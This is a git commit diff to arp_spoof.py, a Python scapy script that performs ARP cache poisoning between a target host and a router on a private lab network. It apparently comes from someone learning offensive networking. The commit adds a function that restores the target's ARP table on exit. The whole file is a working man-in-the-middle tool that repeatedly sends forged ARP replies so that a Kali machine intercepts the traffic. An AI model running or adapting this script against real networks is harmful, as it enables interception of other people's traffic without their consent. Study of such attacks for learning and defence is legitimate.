6df97f520f1b0b36ed007df268e1b06a4d5f59dd
razorboy73 <joshadamkerbel@gmail.com>
2024-06-25 15:38:48 -0400

    added reset function to restore target ARP table

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,16 +1,33 @@
+import sys
 import time
 
 import scapy.all as scapy
 from scapy.layers.l2 import *
+scapy.conf.verb = 0
 
 def main():
     packets_sent = 0;
-    while True:
-        spoof(pdst="172.16.149.129", psrc="172.16.149.2")
-        spoof(pdst="172.16.149.2", psrc="172.16.149.129")
-        packets_sent += 2
-        print(f"[+] Sent {packets_sent} packets")
-        time.sleep(2)
+    try:
+        while True:
+            spoof("172.16.149.129", get_mac("172.16.149.129"), "172.16.149.2")
+            print(get_mac("172.16.149.129"))
+            spoof("172.16.149.2", get_mac("172.16.149.2"), "172.16.149.129")
+            print(get_mac("172.16.149.2"))
+            packets_sent += 2
+            print(f"\r[+] Sent {packets_sent} packets", end="")
+            sys.stdout.flush()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        # destination is the target machine, source is the router
+        reset("172.16.149.129", "172.16.149.2")
+        print("\n[+] Detected CTRL+C - quitting")
+
+def reset(destination, source):
+    # restore the ARP table on target machine
+    packet = scapy.ARP(op=2, pdst=destination, hwdst=get_mac(destination), psrc=source, hwsrc=get_mac(source))
+    print(packet.show())
+    print(packet.summary())
+    scapy.send(packet, verbose=False)
 
 
 def get_mac(ip):
@@ -20,10 +37,10 @@ def get_mac(ip):
     #arp_request.show()
     # print(arp_request.summary())
     # Part 2 - set destination MAC to Broadcast MAC; involves combining frames to broadcast
-    # packets.  Involes creating a frame
+    # packets.  Involves creating a frame
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     # broadcast.show()
-    scapy.ls(scapy.Ether())
+    # scapy.ls(scapy.Ether())
     # print(broadcast.summary())
     # create the frame
     arp_request_broadcast = broadcast / arp_request
@@ -39,14 +56,14 @@ def get_mac(ip):
     # print(clients_lists[0]["mac"])
     return clients_lists[0]["mac"]
 
-def spoof(pdst, psrc):
-    target_mac = get_mac(pdst)
+def spoof(target_ip, target_mac, spoof_ip):
+
     # set the target machine - ip and mac address
     # set the source field as the router
     # sends a packet to the victim, saying I have the routers address
     # this associates the ip address of the router with the MAC address of the kali machine
     # in the ARP table of the target
-    packet = scapy.ARP(op=2, pdst=pdst, hwdst=target_mac, psrc=psrc)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     # print(f"packet.show(): {packet.show()}")
     # print(f"packet.summary(): {packet.summary()}")
     # send the packet and poison the table
